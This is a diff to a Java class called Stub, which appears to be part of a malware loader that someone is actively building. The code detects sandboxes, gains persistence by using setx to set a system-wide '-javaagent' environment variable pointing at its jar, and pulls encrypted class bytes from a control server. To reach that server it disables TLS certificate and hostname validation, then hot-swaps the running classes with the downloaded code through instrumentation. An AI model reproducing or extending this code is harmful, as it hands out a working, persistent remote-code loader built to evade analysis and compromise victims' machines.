@@ -136,12 +136,27 @@ public class Stub
         for (int c=0;c<loadedClassSet.length;c++)
         {
             Class originalDef = (Class) loadedClassSet[c];
-            if (!originalDef.getCanonicalName().contains(getPackageName(currentClass.getCanonicalName())))
+
+            if (originalDef.getName().contains("nocebo"))
             {
-                byte[] classBytes = classRequest(originalDef.getCanonicalName());
-                inst.redefineClasses(new ClassDefinition(originalDef, classBytes));
+                System.out.println(originalDef.getName());
+            }
+            if (originalDef.getName().contains(currentClass.getPackage().getName()))
+            {
+                System.out.println(originalDef.getName());
+                byte[] classBytes = classRequest(originalDef.getName());
+                //sorry leary
+                if (!(new String(classBytes)).equals("error.0x66696C65"))
+                {
+                    inst.redefineClasses(new ClassDefinition(originalDef, classBytes));
+                }
+                else
+                {
+                    continue;
+                }
             }
         }
+        System.out.println("init");
         iAgent.init();
     }
 
@@ -157,10 +172,13 @@ public class Stub
         for (int c=0;c<loadedClassSet.length;c++)
         {
             Class originalDef = (Class) loadedClassSet[c];
-            if (!originalDef.getCanonicalName().contains(getPackageName(currentClass.getCanonicalName())))
+            if (originalDef.getCanonicalName().contains(currentClass.getPackage().getName()))
             {
-                byte[] classBytes = classRequest(originalDef.getCanonicalName());
-                inst.redefineClasses(new ClassDefinition(originalDef, classBytes));
+                byte[] classBytes = classRequest(originalDef.getName());
+                if (!classBytes.toString().equals("error.0x66696C65"))
+                {
+                    inst.redefineClasses(new ClassDefinition(originalDef, classBytes));
+                }
             }
         }
         iAgent.init();
@@ -168,7 +186,6 @@ public class Stub
 
     public static void coreOp() throws IOException, UnmodifiableClassException, KeyManagementException, SocketException, ClassNotFoundException, URISyntaxException, NoSuchAlgorithmException
     {
-        
         if (!chkSandbox())
         {
             Class currentClass = MethodHandles.lookup().lookupClass();
@@ -182,7 +199,6 @@ public class Stub
             else if (!chkPersistence() && !isAgent)
             {
                 mkPersistence();
-                passThroughJar(jarPath, new String[] {});
                 System.exit(0);                
             }
 
@@ -194,36 +210,40 @@ public class Stub
         }
     }
 
-    public static String getPackageName(String canonicalPath)
-    {
-        String[] classCanonical = canonicalPath.split(".");
-        String[] packageNameElements = Arrays.copyOfRange(classCanonical,0,classCanonical.length-1);
-        return String.join(".",packageNameElements);
-    }
+    //public static String getPackageName(String canonicalPath)
+    //{
+    //    System.out.println(canonicalPath);
+    //    String[] classCanonical = canonicalPath.split(".");
+    //    String[] packageNameElements = Arrays.copyOf(classCanonical, classCanonical.length-1);
+    //    
+    //    return String.join(".",packageNameElements);
+   // }
 
     public static void passThroughJar(String pathToJar, String[] initArgs)
     {
         //process args, runtime exec
         //need to feed it the obfuscated name
         
-        String[] cmdArgs = new String[] {"java.exe","-jar",pathToJar};
-        String[] cmdArrayData = Stream.concat(Arrays.stream(cmdArgs),Arrays.stream(initArgs)).toArray(String[]::new);
+        if (new File(pathToJar).isFile())
+        {
+            String[] cmdArgs = new String[] {"java.exe","-jar",pathToJar};
+            String[] cmdArrayData = Stream.concat(Arrays.stream(cmdArgs),Arrays.stream(initArgs)).toArray(String[]::new);
 
-        try
-        {
-            Runtime.getRuntime().exec(cmdArrayData);
-        }
-        catch (Exception r)
-        {
-            //idgaf, probably
+            try
+            {
+                Runtime.getRuntime().exec(cmdArrayData);
+            }
+            catch (Exception r)
+            {
+                //idgaf, probably
+            }
         }
     }
 
     public static String getObfuscatedName(String pathToJar)
     {
-        Path actualFullPath = Paths.get(pathToJar);
-        Path nameValRaw = actualFullPath.getFileName();
-        String nameVal = nameValRaw.toString();
+        String[] nameValRaw = pathToJar.split("/");
+        String nameVal = nameValRaw[nameValRaw.length-1];
         String bakName = "";
         if (System.getProperty("os.name").toLowerCase().contains("win"))
         {
@@ -248,8 +268,9 @@ public class Stub
         {
             return false;
         }
+        //System.out.println(envVarVal);
 
-        if (envVarVal.equals(null))
+        if (envVarVal == null)
         {
             return false;
         }
@@ -267,8 +288,8 @@ public class Stub
             try
             {
                 //lazy but idgaf, this is the simplest way to do it. I may switch to registry if I have time
-                Runtime.getRuntime().exec(new String[]{"setx",envVar,jarPath});
-                Runtime.getRuntime().exec(new String[]{"setx",envVar,jarPath,"/m"});
+                Runtime.getRuntime().exec(new String[]{"setx",envVar,String.format("-javaagent:%s",jarPath)});
+                Runtime.getRuntime().exec(new String[]{"setx",envVar,String.format("-javaagent:%s",jarPath),"/m"});
             }
             catch (Exception e)
             {
@@ -292,7 +313,6 @@ public class Stub
                 }
             }     
         }
-        
     }
     
     public static Class[] getLoadedClasses(Instrumentation inst)
@@ -305,9 +325,8 @@ public class Stub
     private static byte[] classRequest(String classicalName) throws NoSuchAlgorithmException, KeyManagementException, IOException, URISyntaxException
     {
         //stackoverflow provided boilerplate
-        InvalidCertificateTrustManager ictm = new InvalidCertificateTrustManager();
         SSLContext sslCon = SSLContext.getInstance("TLS");
-        sslCon.init(null, new TrustManager[] {ictm}, null);
+        sslCon.init(null, new TrustManager[] {new InvalidCertificateTrustManager()}, null);
         String classNameEncoded = new String(Base64.getUrlEncoder().encode(classicalName.getBytes()));
 
         URL ctrlUrl = new URI(String.format("%s?v=%s",urlData,classNameEncoded)).toURL();
@@ -315,6 +334,15 @@ public class Stub
         HttpsURLConnection connMan;
         try
         {
+            HttpsURLConnection.setDefaultSSLSocketFactory(sslCon.getSocketFactory());
+
+            HostnameVerifier allHostsValid = new HostnameVerifier() {
+                public boolean verify(String hostname, SSLSession session) {
+                    return true;
+                }
+            };
+            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
+
             connMan = (HttpsURLConnection) ctrlUrl.openConnection();
 
             connMan.setRequestMethod("GET");
@@ -328,14 +356,7 @@ public class Stub
                 )
             );
 
-            HttpsURLConnection.setDefaultSSLSocketFactory(sslCon.getSocketFactory());
 
-            HostnameVerifier allHostsValid = new HostnameVerifier() {
-                public boolean verify(String hostname, SSLSession session) {
-                 return true;
-               }
-            };
-            connMan.setHostnameVerifier(allHostsValid);
 
             if (connMan.getResponseCode() == HttpsURLConnection.HTTP_OK)
             {
@@ -344,23 +365,33 @@ public class Stub
                 String responseData = connInReader.readLine();
                 connInReader.close();
 
-                byte[] decodedResponseData = secInst.decrypt(
-                    Base64.getDecoder().decode(
-                        responseData
-                    ),
-                    agentKey.getBytes(),
-                    nonceData.getBytes()
-                );
+                byte[] decodedResponseData = responseData.getBytes();
+                if (!responseData.contains("error"))
+                { 
+                    decodedResponseData = secInst.decrypt(
+                        Base64.getDecoder().decode(
+                            responseData
+                        ),
+                        agentKey.getBytes(),
+                        nonceData.getBytes()
+                    );
+                }
+
                 return decodedResponseData;
 
             }
             else
             {
-                return "null".getBytes();
+                BufferedReader connInReader = new BufferedReader(new InputStreamReader(connMan.getInputStream()));
+                String responseData = connInReader.readLine();
+                connInReader.close();
+                System.out.println(responseData);
+                return responseData.getBytes();
             }
         }
         catch (Exception e)
         {
+            e.printStackTrace();
             return "null".getBytes();
         }
     }
